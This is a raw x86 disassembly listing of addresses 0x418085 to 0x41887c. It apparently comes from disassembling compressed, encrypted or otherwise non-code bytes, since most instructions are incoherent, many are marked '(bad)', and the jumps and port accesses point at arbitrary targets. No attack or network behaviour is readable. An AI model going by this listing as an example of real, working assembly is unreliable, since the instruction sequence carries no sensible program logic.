  418085:	idiv   DWORD PTR [eax-0x68]
  418088:	test   eax,0x7697924b
  41808d:	adc    DWORD PTR [ecx+0x484750a4],edx
  418093:	cwde   
  418094:	es (bad) 
  418096:	pop    ebx
  418097:	inc    esp
  418098:	mov    DWORD PTR ds:0x568dc5cd,eax
  41809e:	adc    DWORD PTR [ebp-0x2a42d020],eax
  4180a4:	mov    ecx,0x7ff30bcf
  4180a9:	or     eax,0x84379cd1
  4180ae:	add    DWORD PTR [esi],ebx
  4180b0:	in     al,dx
  4180b1:	scas   al,BYTE PTR es:[edi]
  4180b2:	loope  0x418055
  4180b4:	adc    bl,BYTE PTR [ebx]
  4180b6:	icebp  
  4180b7:	into   
  4180b8:	cmp    bl,al
  4180ba:	ror    esp,cl
  4180bc:	call   0x7f8:0x860dda49
  4180c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180c4:	jecxz  0x418061
  4180c6:	popa   
  4180c7:	xor    eax,edx
  4180c9:	lahf   
  4180ca:	stos   BYTE PTR es:[edi],al
  4180cb:	gs jecxz 0x4180a1
  4180ce:	jae    0x41812a
  4180d0:	daa    
  4180d1:	mov    ?,WORD PTR ss:[esi]
  4180d4:	mov    bl,0xdc
  4180d6:	and    DWORD PTR [ebx+0x63b74df8],ecx
  4180dc:	pop    si
  4180de:	mov    ebp,0x22741ab1
  4180e3:	pop    ss
  4180e4:	cdq    
  4180e5:	shr    BYTE PTR [edx-0x6817eae0],0x3a
  4180ec:	sub    eax,0xc7613f51
  4180f1:	fwait
  4180f2:	adc    al,0x50
  4180f4:	cmp    eax,0x16f1aa8c
  4180f9:	add    DWORD PTR [ebp+0x2e],0xd2b47357
  418100:	dec    edx
  418101:	adc    edx,DWORD PTR [edx+0x596afffe]
  418107:	mov    eax,0x285675f9
  41810c:	shl    DWORD PTR [edi],1
  41810e:	or     edi,edi
  418110:	adc    edx,DWORD PTR [si-0x26]
  418114:	mov    al,0x4c
  418116:	pop    es
  418117:	sbb    al,0xee
  418119:	(bad)  
  41811b:	je     0x4180c2
  41811d:	mov    eax,ds:0x16d3368c
  418122:	xor    eax,0x38d226ba
  418127:	loop   0x418183
  418129:	cwde   
  41812a:	fmul   st,st(6)
  41812c:	jl     0x418103
  41812e:	sbb    eax,0x12badd4e
  418133:	lods   eax,DWORD PTR ds:[esi]
  418134:	xor    edx,esp
  418136:	or     DWORD PTR [eax+0x6e2ba888],edi
  41813c:	(bad)  
  41813d:	push   ebp
  41813e:	(bad)  
  41813f:	xchg   edi,eax
  418140:	and    al,0xc0
  418142:	fs adc al,0x2
  418145:	sahf   
  418146:	(bad)  
  418147:	mov    eax,ds:0xf71b3571
  41814c:	repz push edi
  41814e:	fst    DWORD PTR [eax-0x3c]
  418151:	pop    ds
  418152:	ss jmp DWORD PTR es:[ebp-0x35ac905e]
  41815a:	push   edi
  41815b:	imul   eax,esp,0x22
  41815e:	loopne 0x4181c6
  418160:	pop    edx
  418161:	in     eax,dx
  418162:	out    0x3c,al
  418164:	push   edx
  418165:	data16 cmc 
  418167:	call   0x1efee7a4
  41816c:	jnp    0x418134
  41816e:	ror    BYTE PTR [edx+0x72a409c],0xa6
  418175:	(bad)  
  418177:	enter  0xe8d2,0x28
  41817b:	retf   0x9f5a
  41817e:	cli    
  41817f:	scas   al,BYTE PTR es:[edi]
  418180:	mov    al,ss:0x282464e8
  418186:	dec    eax
  418187:	and    esp,DWORD PTR [edi]
  418189:	sbb    bh,BYTE PTR [ebp+0x6f]
  41818c:	sub    ebx,edi
  41818e:	push   es
  41818f:	fimul  DWORD PTR [edi]
  418191:	and    al,0x77
  418193:	push   edi
  418194:	shl    BYTE PTR [ecx*4-0x2282c5a9],0x5c
  41819c:	sbb    DWORD PTR [esi-0x4fc7d1d6],0xec83c7cf
  4181a6:	fwait
  4181a7:	pop    esi
  4181a8:	push   eax
  4181a9:	popf   
  4181aa:	jmp    0x7d38:0x59988e18
  4181b1:	xor    al,BYTE PTR [ecx+0x2bbfd6f7]
  4181b7:	add    eax,0xfe167cf6
  4181bc:	adc    eax,0xca53f8d6
  4181c1:	mov    bh,BYTE PTR [ebx+edi*8-0x3e]
  4181c5:	cmp    DWORD PTR [ecx+0x2c],edx
  4181c8:	jp     0x418178
  4181ca:	clc    
  4181cb:	daa    
  4181cc:	pushf  
  4181cd:	jmp    0x2b6cfdf2
  4181d2:	scas   al,BYTE PTR es:[edi]
  4181d3:	(bad)  
  4181d4:	fs xor esi,ebp
  4181d7:	fdivr  QWORD PTR [esi+ebp*1-0x57]
  4181db:	rcr    DWORD PTR [eax+0x5d],1
  4181de:	push   ss
  4181df:	mov    eax,0xe39be3a2
  4181e4:	mov    ebx,0x27ac0141
  4181e9:	stos   DWORD PTR es:[edi],eax
  4181ea:	outs   dx,BYTE PTR ds:[esi]
  4181eb:	adc    BYTE PTR [edx+0x16e5eb7c],ah
  4181f1:	addr16 cld 
  4181f3:	sub    ebp,DWORD PTR [ebx-0xf]
  4181f6:	stos   BYTE PTR es:[edi],al
  4181f7:	jg     0x418242
  4181f9:	adc    DWORD PTR [eax],0x769081e
  4181ff:	jnp    0x4181b9
  418201:	xchg   ebp,eax
  418202:	dec    ecx
  418203:	jae    0x418212
  418205:	into   
  418206:	jp     0x418203
  418208:	mov    WORD PTR [ebx+0xc5b9f21],gs
  41820e:	test   DWORD PTR [edx],ebp
  418210:	xchg   edi,eax
  418211:	and    dh,al
  418213:	aad    0x4a
  418215:	in     eax,0xd0
  418217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418218:	dec    ecx
  418219:	enter  0xcdd2,0x8f
  41821d:	nop
  41821e:	mov    esp,0x50aca8f3
  418223:	dec    eax
  418224:	mov    eax,0xf63f1026
  418229:	xchg   BYTE PTR [ecx+0x5],ch
  41822c:	xor    esi,DWORD PTR [edi-0x445a7818]
  418232:	xor    al,0xf9
  418234:	inc    edi
  418235:	aas    
  418236:	pop    es
  418237:	lods   eax,DWORD PTR fs:[esi]
  418239:	mov    BYTE PTR [eax+0x670bfa04],dl
  41823f:	ss dec esi
  418241:	xchg   esp,eax
  418242:	test   eax,0x4716d578
  418247:	and    DWORD PTR [ecx],edi
  418249:	push   edx
  41824a:	xor    ah,BYTE PTR [ebx-0x51]
  41824d:	mov    esi,0x8f84e13e
  418252:	push   ebx
  418253:	in     al,0x53
  418255:	mov    ah,0xb2
  418257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418258:	in     eax,dx
  418259:	and    cl,ch
  41825b:	hlt    
  41825c:	std    
  41825d:	cdq    
  41825e:	clc    
  41825f:	ficom  DWORD PTR [ebp-0x4c]
  418262:	push   ss
  418263:	outs   dx,BYTE PTR ds:[esi]
  418264:	or     al,0x99
  418266:	pop    ss
  418267:	xor    DWORD PTR [esi+0x60],esp
  41826a:	push   0x9654813b
  41826f:	pop    ecx
  418270:	inc    ecx
  418271:	lahf   
  418272:	repz and al,0x57
  418275:	xchg   DWORD PTR [eax-0x1b],edx
  418278:	enter  0xdce6,0x33
  41827c:	sub    eax,0xcd4f4175
  418281:	xor    eax,0x60914f16
  418286:	xlat   BYTE PTR ds:[ebx]
  418287:	pop    esp
  418288:	repz cdq 
  41828a:	imul   eax,DWORD PTR [edx],0xffffffae
  41828d:	xchg   ebx,eax
  41828e:	rcr    BYTE PTR [edi-0x292665a5],0xdf
  418295:	dec    edi
  418296:	push   edi
  418297:	pusha  
  418298:	jno    0x41828f
  41829a:	adc    edi,DWORD PTR [ebx+esi*2]
  41829d:	rcr    al,cl
  41829f:	in     eax,dx
  4182a0:	mov    dh,0x8d
  4182a2:	(bad)  [edx]
  4182a4:	xor    al,0x4d
  4182a6:	in     al,dx
  4182a7:	push   esp
  4182a8:	fs or  eax,0xe04d16b8
  4182ae:	loop   0x4182f6
  4182b0:	jo     0x4182ed
  4182b2:	lods   al,BYTE PTR ds:[esi]
  4182b3:	push   esp
  4182b4:	push   esp
  4182b5:	sub    esp,DWORD PTR ds:0xd0c47b8
  4182bb:	xor    edi,esp
  4182bd:	xor    ebx,DWORD PTR [ebx-0x6c727db3]
  4182c3:	add    esi,eax
  4182c5:	ja     0x418344
  4182c7:	sub    DWORD PTR [ebx+0x58de8f43],eax
  4182cd:	cmp    DWORD PTR [edx+edi*4],eax
  4182d0:	idiv   BYTE PTR [edx]
  4182d2:	xor    eax,0x43000f98
  4182d7:	stos   DWORD PTR es:[edi],eax
  4182d8:	stos   DWORD PTR es:[edi],eax
  4182d9:	xchg   bl,dh
  4182db:	mov    WORD PTR [edx],?
  4182dd:	push   edx
  4182de:	repnz inc esp
  4182e0:	xchg   ebp,eax
  4182e1:	cmp    ah,BYTE PTR [ebp-0x515f6e3c]
  4182e7:	xor    BYTE PTR [esi-0x54],0x4
  4182eb:	dec    esi
  4182ec:	add    eax,0xdf5fe706
  4182f1:	inc    ebp
  4182f2:	adc    edx,DWORD PTR [ebx]
  4182f4:	(bad)  
  4182f5:	sbb    eax,0x2c3f07d6
  4182fa:	icebp  
  4182fb:	lock adc eax,0xbd1438
  418301:	and    BYTE PTR [ebp+0x29],dh
  418304:	int3   
  418305:	xchg   esp,eax
  418306:	shl    DWORD PTR [edi],cl
  418308:	or     BYTE PTR [edx+0x54af8f98],bl
  41830e:	gs in  al,dx
  418310:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418311:	mov    edx,0xaf564702
  418316:	outs   dx,DWORD PTR ds:[esi]
  418317:	sbb    ah,BYTE PTR [ecx]
  418319:	cdq    
  41831a:	push   edi
  41831b:	in     eax,dx
  41831c:	push   esp
  41831d:	jmp    0x836eccad
  418322:	cmp    al,0x93
  418324:	and    al,0x63
  418326:	cmp    cl,BYTE PTR [eax-0x140583ca]
  41832c:	sbb    al,0x30
  41832e:	push   edi
  41832f:	jmp    0x75f1:0x85e2ade4
  418336:	scas   eax,DWORD PTR es:[edi]
  418337:	pop    esp
  418338:	inc    eax
  418339:	cmp    DWORD PTR [esi+edx*2],ebp
  41833c:	push   es
  41833d:	jnp    0x4182fd
  41833f:	jmp    0xccd2:0xc3c53af8
  418346:	dec    eax
  418347:	cmp    ecx,DWORD PTR [ebx-0x1c]
  41834a:	repz mov ds:0xa3e472be,al
  418350:	mov    esp,0x9ae51259
  418355:	pop    esp
  418356:	lods   eax,DWORD PTR ds:[esi]
  418357:	scas   eax,DWORD PTR es:[edi]
  418358:	repz arpl WORD PTR [ebp+0x105a48f],bp
  41835f:	retf   0x8ed1
  418362:	or     cl,BYTE PTR [ebp-0x3c9567ac]
  418368:	shl    edi,1
  41836a:	aad    0x2a
  41836c:	jg     0x418378
  41836e:	push   ebp
  41836f:	inc    esi
  418370:	adc    dh,bh
  418372:	jmp    0xcaf7c908
  418377:	mov    BYTE PTR [ecx-0x6d],al
  41837a:	shr    bh,cl
  41837c:	cwde   
  41837d:	int3   
  41837e:	and    ah,ah
  418380:	cwde   
  418381:	pop    ss
  418382:	fst    QWORD PTR [esi-0x70]
  418385:	or     ebx,DWORD PTR [ecx+eax*2-0x26]
  418389:	(bad)  
  41838a:	mov    edx,0xa9589e3c
  41838f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418390:	(bad)  
  418391:	mov    bl,0x9c
  418393:	push   0xffffffc9
  418395:	int3   
  418396:	fnstsw WORD PTR [ecx-0x7975a82a]
  41839c:	mov    ch,0x78
  41839e:	mov    ds:0xfc147d74,al
  4183a3:	sbb    eax,0xdc194dff
  4183a8:	mul    DWORD PTR [ebx+0x2630dd1f]
  4183ae:	xlat   BYTE PTR ds:[ebx]
  4183af:	dec    edx
  4183b0:	in     eax,dx
  4183b1:	cmp    eax,0xe8a5f9a2
  4183b6:	jmp    0xd1b3c4fc
  4183bb:	pop    es
  4183bc:	(bad)  
  4183bd:	rol    bl,1
  4183bf:	pslld  mm4,QWORD PTR [ebp+0x64]
  4183c3:	xchg   ebx,eax
  4183c4:	mov    es,WORD PTR [eax]
  4183c6:	or     edi,eax
  4183c8:	test   DWORD PTR [ecx],0x4eba7f1a
  4183ce:	int    0xb7
  4183d0:	dec    eax
  4183d1:	and    eax,0xe6c6dcb3
  4183d6:	int    0x7b
  4183d8:	(bad)  
  4183d9:	ins    BYTE PTR es:[edi],dx
  4183da:	jp     0x418435
  4183dc:	cld    
  4183dd:	cmp    dl,BYTE PTR [ebx+edi*2-0x2f679962]
  4183e4:	aam    0x74
  4183e6:	(bad)  
  4183e7:	xor    dh,BYTE PTR [eax]
  4183e9:	cli    
  4183ea:	daa    
  4183eb:	mov    ds:0x8d37593d,eax
  4183f0:	aas    
  4183f1:	add    ch,0x43
  4183f4:	cld    
  4183f5:	daa    
  4183f6:	xchg   ebx,eax
  4183f7:	mov    eax,0x36cd4c1f
  4183fc:	out    dx,eax
  4183fd:	and    ah,dl
  4183ff:	add    bl,al
  418401:	loop   0x418460
  418403:	and    BYTE PTR ds:0xe00a9c28,ah
  418409:	in     al,0xf2
  41840b:	mov    dh,0x36
  41840d:	pop    ebx
  41840e:	out    0xd2,al
  418410:	add    BYTE PTR [edx],ch
  418412:	les    ebp,FWORD PTR [eax+0x190af392]
  418418:	pop    ds
  418419:	sub    BYTE PTR [edx-0x7],bh
  41841c:	stos   BYTE PTR es:[edi],al
  41841d:	out    0x39,al
  41841f:	out    dx,al
  418420:	mov    al,0x6e
  418422:	stc    
  418423:	pop    edx
  418424:	ret    
  418425:	mov    ds:0x1b94ccf6,eax
  41842a:	pop    edx
  41842b:	jbe    0x41841b
  41842d:	inc    eax
  41842e:	mov    ah,0x11
  418430:	xchg   esi,eax
  418431:	xor    eax,0xe88e69ab
  418436:	dec    eax
  418437:	xor    ebp,0x13
  41843a:	add    eax,0x5bef7214
  41843f:	test   al,0x9a
  418441:	mov    DWORD PTR [ebp+0x5482947a],ecx
  418447:	jnp    0x418473
  418449:	jl     0x418423
  41844b:	ja     0x41844d
  41844d:	fidivr WORD PTR [ebx-0x621e718d]
  418453:	cmp    dh,BYTE PTR [ebx]
  418455:	xchg   esp,eax
  418456:	xchg   ecx,eax
  418457:	rol    BYTE PTR ds:0x759b02e9,cl
  41845d:	cwde   
  41845e:	push   es
  41845f:	jnp    0x418444
  418461:	outs   dx,BYTE PTR ds:[esi]
  418462:	mov    dl,0x6c
  418464:	test   eax,0xf6bd76ee
  418469:	cmp    al,0x90
  41846b:	xchg   BYTE PTR [edi+0x74673bd4],ah
  418471:	pop    ebx
  418472:	mov    bx,WORD PTR [esi+0x4e32d619]
  418479:	cmp    edx,DWORD PTR [ecx]
  41847b:	cli    
  41847c:	int3   
  41847d:	leave  
  41847e:	repnz or eax,0x847fc358
  418484:	mov    edx,0x16815ad4
  418489:	out    dx,eax
  41848a:	ins    DWORD PTR es:[edi],dx
  41848b:	test   DWORD PTR [ecx+0x56],0x17199ce7
  418492:	test   BYTE PTR [ebx-0x5118ca55],dl
  418498:	stos   DWORD PTR es:[edi],eax
  418499:	push   0x72
  41849b:	sbb    dl,BYTE PTR [eax]
  41849d:	add    eax,0xb06486db
  4184a2:	lahf   
  4184a3:	shr    esi,1
  4184a5:	xor    al,0xd6
  4184a7:	sti    
  4184a8:	shr    DWORD PTR [ebx+ebp*4+0x0],1
  4184ac:	adc    BYTE PTR [esi],0x39
  4184af:	rcl    DWORD PTR [edx-0x11],cl
  4184b2:	stos   BYTE PTR es:[edi],al
  4184b3:	or     al,0xdb
  4184b5:	dec    edx
  4184b6:	jno    0x418476
  4184b8:	xor    eax,0x815b4ac7
  4184bd:	push   ss
  4184be:	mov    BYTE PTR [ecx-0x3],0x9b
  4184c2:	fwait
  4184c3:	stos   DWORD PTR es:[edi],eax
  4184c4:	mov    bl,0x95
  4184c6:	sbb    ch,BYTE PTR [eax-0x430f168a]
  4184cc:	imul   edi,DWORD PTR [eax+0x36c3c2b3],0xe1cdadff
  4184d6:	pop    ss
  4184d7:	lea    ebx,[edi-0x33]
  4184da:	xlat   BYTE PTR ds:[ebx]
  4184db:	les    esi,FWORD PTR [ebx+0x2b5aca68]
  4184e1:	xchg   BYTE PTR [eax],ah
  4184e3:	clc    
  4184e4:	xchg   edi,eax
  4184e5:	xor    DWORD PTR [eax-0x27],0xffffffcf
  4184e9:	jle    0x4184f3
  4184eb:	sbb    BYTE PTR [edx-0x2e],dh
  4184ee:	rcr    BYTE PTR ds:0xc4abbd45,cl
  4184f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184f5:	lods   eax,DWORD PTR ds:[esi]
  4184f6:	jb     0x4184ee
  4184f8:	sub    eax,0x5a675520
  4184fd:	fucom  st(0)
  4184ff:	adc    eax,0x2c456b4b
  418504:	mov    ds:0x93cde8eb,eax
  418509:	sub    BYTE PTR [ebp+0x5d],0xf9
  41850d:	ficom  WORD PTR [ebx]
  41850f:	(bad)  
  418510:	jl     0x418499
  418512:	fiadd  WORD PTR [ecx+0x0]
  418515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418516:	or     eax,0xbc220fb6
  41851b:	or     eax,0x7aa1f55b
  418520:	pop    ecx
  418521:	fdivr  DWORD PTR [edi-0x5a4d4796]
  418527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418528:	sub    BYTE PTR [edx*4+0x2a3898f3],dh
  41852f:	pop    eax
  418530:	adc    ah,ah
  418532:	xor    bl,BYTE PTR [ebx-0x5f]
  418535:	push   edi
  418536:	shl    BYTE PTR [edi+esi*8-0x41952e73],0x3b
  41853e:	mov    edi,0x1d631981
  418543:	pop    edi
  418544:	mov    bh,0x69
  418546:	sub    al,0xd0
  418548:	in     eax,0x69
  41854a:	inc    eax
  41854b:	mov    BYTE PTR [edi+0x23ed71de],0x42
  418552:	cli    
  418553:	mov    cl,0x82
  418555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418556:	dec    edi
  418557:	sbb    cl,BYTE PTR [esi]
  418559:	sbb    al,0x47
  41855b:	pop    edx
  41855c:	sub    eax,0x4775b069
  418561:	push   ecx
  418562:	jmp    0x41850a
  418564:	stc    
  418565:	push   cs
  418566:	fild   WORD PTR [ecx-0x46fc695c]
  41856c:	arpl   WORD PTR [eax+0x5c],cx
  41856f:	push   edi
  418570:	or     eax,0x81996ac
  418575:	mov    al,ds:0x669e83f4
  41857a:	jbe    0x418544
  41857c:	clc    
  41857d:	push   cs
  41857e:	mov    esp,0xce160599
  418583:	jbe    0x4185bc
  418585:	fld    st(4)
  418587:	push   es
  418588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418589:	push   ebp
  41858a:	jle    0x418604
  41858c:	xchg   edx,eax
  41858d:	shr    BYTE PTR [ebx],cl
  41858f:	xor    ah,cl
  418591:	jle    0x4185ee
  418593:	icebp  
  418594:	xchg   DWORD PTR [eax-0x4078e4c6],ecx
  41859a:	sbb    ebp,DWORD PTR [edx]
  41859c:	imul   ebx,DWORD PTR [esi],0xfffffffa
  41859f:	dec    ebx
  4185a0:	test   al,0xdc
  4185a2:	add    al,0xc0
  4185a4:	mov    edi,0x5cf360ab
  4185a9:	popa   
  4185aa:	push   edi
  4185ab:	(bad)  
  4185ac:	push   esp
  4185ad:	mov    eax,0x3e80441
  4185b2:	mov    bh,0x40
  4185b4:	test   al,0x3e
  4185b6:	xor    BYTE PTR [edi+0x1],bh
  4185b9:	jp     0x418571
  4185bb:	jne    0x418580
  4185bd:	(bad)  
  4185be:	push   ebp
  4185bf:	dec    ecx
  4185c0:	mov    bl,BYTE PTR [edx+0xf383101]
  4185c6:	inc    edi
  4185c7:	jmp    0xb97c:0x2ef1223e
  4185ce:	(bad)  
  4185cf:	xor    al,0xef
  4185d1:	pop    ss
  4185d2:	daa    
  4185d3:	add    DWORD PTR [ebx+0x2b],eax
  4185d6:	rcl    BYTE PTR [ebp+0x4dd3cad0],cl
  4185dc:	daa    
  4185dd:	mov    dl,0xc0
  4185df:	push   ss
  4185e0:	imul   BYTE PTR [edi-0x10]
  4185e3:	stc    
  4185e4:	test   DWORD PTR [ebx-0x3a],esi
  4185e7:	pop    ss
  4185e8:	ss mov esi,0x332c19af
  4185ee:	mov    ds,WORD PTR [eax-0x3b]
  4185f1:	inc    ecx
  4185f2:	out    dx,eax
  4185f3:	out    dx,al
  4185f4:	scas   eax,DWORD PTR es:[edi]
  4185f5:	jg     0x41858a
  4185f7:	ja     0x41862b
  4185f9:	inc    ebp
  4185fa:	pop    esi
  4185fb:	xlat   BYTE PTR ds:[ebx]
  4185fc:	fs push 0x295780ca
  418602:	stos   DWORD PTR es:[edi],eax
  418603:	inc    ebx
  418604:	mov    edi,0xf1de7264
  418609:	aaa    
  41860a:	mov    dh,0x54
  41860c:	out    dx,eax
  41860d:	ret    0x969e
  418610:	leave  
  418611:	je     0x4185f1
  418613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418614:	sbb    cl,dh
  418616:	cdq    
  418617:	pop    ebx
  418618:	pop    edi
  418619:	sub    esp,DWORD PTR [esi+0x3d]
  41861c:	sub    BYTE PTR [ecx-0x7956916e],cl
  418622:	hlt    
  418623:	mov    edx,0xf8c28fdc
  418628:	ror    BYTE PTR [esi+0x4f],1
  41862b:	push   esi
  41862c:	ds nop
  41862e:	push   0x4c
  418630:	(bad)  
  418631:	std    
  418632:	popa   
  418633:	sbb    DWORD PTR [ebx+ebx*2],ebp
  418636:	mov    eax,0xe224261d
  41863b:	outs   dx,BYTE PTR ds:[esi]
  41863c:	xor    eax,0x3563e6c2
  418641:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418643:	cmp    eax,DWORD PTR [ebx]
  418645:	dec    edi
  418646:	js     0x4185fa
  418648:	mov    ecx,0x1cf84c1d
  41864d:	(bad)  [ebx+0x49]
  418650:	out    0x32,eax
  418652:	add    al,0x60
  418654:	sbb    ebx,DWORD PTR [ecx]
  418656:	les    eax,FWORD PTR [eax+0x5c31b0ae]
  41865c:	and    eax,0x38da6a48
  418661:	dec    ecx
  418662:	and    DWORD PTR [ebx+0x7f0b5708],eax
  418668:	ret    0x14d9
  41866b:	fistp  WORD PTR [edi+ebx*8-0x23f4b9b8]
  418672:	or     dl,BYTE PTR [ebx+0x77]
  418675:	shl    edx,0x54
  418678:	mov    ebp,0xa812058e
  41867d:	dec    ebp
  41867e:	sub    al,0x8
  418680:	mov    ds:0xdc37f702,al
  418685:	xor    al,0xa8
  418687:	scas   al,BYTE PTR es:[edi]
  418688:	dec    edx
  418689:	sbb    BYTE PTR ds:0x54cfe55,dl
  41868f:	in     eax,dx
  418690:	aas    
  418691:	imul   ecx,DWORD PTR [edi-0x3c0c07c0],0x23
  418698:	sbb    al,0x31
  41869a:	jbe    0x4186e4
  41869c:	push   0x87963e7a
  4186a1:	(bad)  
  4186a2:	test   BYTE PTR [ecx],0x19
  4186a5:	ss repz sbb esi,eax
  4186a9:	ja     0x4186a1
  4186ab:	out    dx,eax
  4186ac:	adc    edx,DWORD PTR [edx+0x0]
  4186af:	out    dx,al
  4186b0:	push   0x55d10151
  4186b5:	sbb    eax,0xdb4f8ce8
  4186ba:	xor    eax,0x42ccbdec
  4186bf:	cmp    DWORD PTR [esi],edi
  4186c1:	aas    
  4186c2:	popa   
  4186c3:	add    eax,0xffe5be84
  4186c8:	mov    esi,0x62c5f00
  4186cd:	and    BYTE PTR [ebp-0x3327aa9e],0xcd
  4186d4:	stos   BYTE PTR es:[edi],al
  4186d5:	arpl   WORD PTR [ebx+0x28],sp
  4186d8:	or     al,0x5a
  4186da:	in     eax,0x84
  4186dc:	inc    ebx
  4186dd:	mov    eax,DWORD PTR [ecx+eiz*4-0x2b581cd1]
  4186e4:	inc    edx
  4186e5:	jmp    0xfe8cd916
  4186ea:	enter  0xbd88,0xc8
  4186ee:	jle    0x418691
  4186f0:	loop   0x418763
  4186f2:	xor    DWORD PTR ds:0x29de1738,esp
  4186f8:	(bad)  
  4186f9:	mov    dl,0xe4
  4186fb:	mov    ecx,0x3db158ca
  418700:	mov    BYTE PTR [esi],dl
  418702:	popa   
  418703:	sub    DWORD PTR ds:0xe3ff06bf,esi
  418709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41870a:	mov    ebx,0xb6426fc4
  41870f:	push   edi
  418710:	xchg   ebp,eax
  418711:	ins    DWORD PTR es:[edi],dx
  418712:	cdq    
  418713:	lahf   
  418714:	dec    esp
  418715:	add    al,BYTE PTR [edi+eax*4-0x36409af1]
  41871c:	test   DWORD PTR [edx-0x6a672c8e],0x2b1485b8
  418726:	in     al,0xa5
  418728:	std    
  418729:	lods   al,BYTE PTR ds:[esi]
  41872a:	adc    esi,DWORD PTR [eax]
  41872c:	push   ebx
  41872d:	test   DWORD PTR [eax-0x705620f0],ebp
  418733:	repz test BYTE PTR [ebx-0x37cbc071],dl
  41873a:	mov    dh,0x7a
  41873c:	inc    edx
  41873d:	scas   al,BYTE PTR es:[edi]
  41873e:	fisub  DWORD PTR [edx+0x1b]
  418741:	fist   DWORD PTR [esi-0x386d1230]
  418747:	cmp    eax,0xfffffff7
  41874a:	sbb    ecx,DWORD PTR [ebp+eiz*8+0x68]
  41874e:	push   esi
  41874f:	fwait
  418750:	xchg   dl,ch
  418752:	jmp    0x1a903eb9
  418757:	sub    ah,BYTE PTR [ebx+0x50c39283]
  41875d:	pop    ebx
  41875e:	jp     0x4186fd
  418760:	sbb    DWORD PTR [esi],edi
  418762:	fxch   st(7)
  418764:	xchg   esi,eax
  418765:	and    DWORD PTR [ebx],esp
  418767:	jnp    0x4187dc
  418769:	or     DWORD PTR [edi-0x115f46f9],0x33ed1cae
  418773:	ins    DWORD PTR es:[edi],dx
  418774:	push   0x7c
  418776:	push   ds
  418777:	or     BYTE PTR [ebp-0x30],0x46
  41877b:	stos   DWORD PTR es:[edi],eax
  41877c:	mov    ds:0x49a8681b,eax
  418781:	ret    
  418782:	adc    al,0x49
  418784:	xlat   BYTE PTR ds:[ebx]
  418785:	mov    bh,0x4e
  418787:	sub    DWORD PTR [ebx+ebx*4+0x3f],esi
  41878b:	adc    DWORD PTR [ebx+eiz*4-0xe],esp
  41878f:	loope  0x41872b
  418791:	outs   dx,BYTE PTR ds:[esi]
  418792:	leave  
  418793:	mov    cl,0x10
  418795:	sahf   
  418796:	ins    DWORD PTR es:[edi],dx
  418797:	les    ecx,FWORD PTR [eax+0x55210cba]
  41879d:	(bad)  
  41879e:	aam    0xa0
  4187a0:	sub    BYTE PTR [edi+0x3b],bh
  4187a3:	jb     0x418777
  4187a5:	pop    eax
  4187a6:	and    ecx,DWORD PTR [esi-0xd]
  4187a9:	sahf   
  4187aa:	pop    edx
  4187ab:	mov    ah,0xd9
  4187ad:	aas    
  4187ae:	ret    0xc362
  4187b1:	cli    
  4187b2:	ror    BYTE PTR [esi+0x6c],cl
  4187b5:	cli    
  4187b6:	inc    eax
  4187b7:	inc    edi
  4187b8:	lds    esp,FWORD PTR [ecx+0x10]
  4187bb:	stc    
  4187bc:	jbe    0x418783
  4187be:	dec    eax
  4187bf:	jae    0x418809
  4187c1:	bound  esi,QWORD PTR [eax-0x9459d83]
  4187c7:	sbb    esp,DWORD PTR [ebp-0x231f0b6d]
  4187cd:	(bad)  
  4187ce:	push   cs
  4187cf:	cs sti 
  4187d1:	mov    ds:0xb9d9dc61,eax
  4187d6:	fisttp QWORD PTR [ebx-0x3e]
  4187d9:	fwait
  4187da:	xor    al,0x17
  4187dc:	adc    ch,al
  4187de:	sar    DWORD PTR [ecx-0x4fb31b10],cl
  4187e4:	test   al,0x66
  4187e6:	loopne 0x418783
  4187e8:	ins    BYTE PTR es:[edi],dx
  4187e9:	cmp    BYTE PTR [eax+0x52],bh
  4187ec:	ret    
  4187ed:	inc    ebp
  4187ee:	fild   WORD PTR [edi]
  4187f0:	xchg   edi,eax
  4187f1:	xchg   DWORD PTR [eax-0x17fc4373],ebp
  4187f7:	outs   dx,DWORD PTR ds:[esi]
  4187f8:	and    edx,DWORD PTR [ebx+0x1e8c1b82]
  4187fe:	fsqrt  
  418800:	dec    esi
  418801:	mov    BYTE PTR [ecx+0x3],0xed
  418805:	mov    al,bl
  418807:	mov    ecx,0x11918594
  41880c:	jo     0x418857
  41880e:	xchg   BYTE PTR ds:0x53238b5b,bl
  418814:	out    dx,eax
  418815:	mov    ds:0x5c72a76a,al
  41881a:	cld    
  41881b:	sti    
  41881c:	icebp  
  41881d:	mov    ds:0x1045395f,al
  418822:	fnstsw WORD PTR [eax+ecx*8]
  418825:	push   es
  418826:	or     eax,0x11fb759e
  41882b:	std    
  41882c:	popf   
  41882d:	fs xchg ecx,eax
  41882f:	ret    
  418830:	lds    ebp,FWORD PTR [ebx]
  418832:	jmp    0x6a9e:0xc71bbe0
  418839:	sub    eax,0x51d1edd5
  41883e:	rol    BYTE PTR [ebx+0x23f009c8],cl
  418844:	pop    ecx
  418845:	(bad)  
  418846:	clc    
  418847:	adc    eax,0xec058998
  41884c:	pop    edi
  41884d:	(bad)  [esi-0x481bd040]
  418853:	push   ss
  418854:	push   eax
  418855:	add    ecx,ecx
  418857:	xchg   ecx,eax
  418858:	mov    al,0x13
  41885a:	jnp    0x418869
  41885c:	fwait
  41885d:	sbb    DWORD PTR [edi-0x5b84b67c],esi
  418863:	add    eax,0xabb20985
  418868:	dec    eax
  418869:	test   al,0x2c
  41886b:	jecxz  0x41887e
  41886d:	push   edx
  41886e:	loopne 0x418889
  418870:	lahf   
  418871:	jo     0x418809
  418873:	sub    ebx,edx
  418875:	lds    ecx,FWORD PTR [ebx]
  418877:	lods   al,BYTE PTR ds:[esi]
  418878:	cmc    
  418879:	loopne 0x41889b
  41887b:	stc    
  41887c:	test   BYTE PTR [edx-0x1d],bh
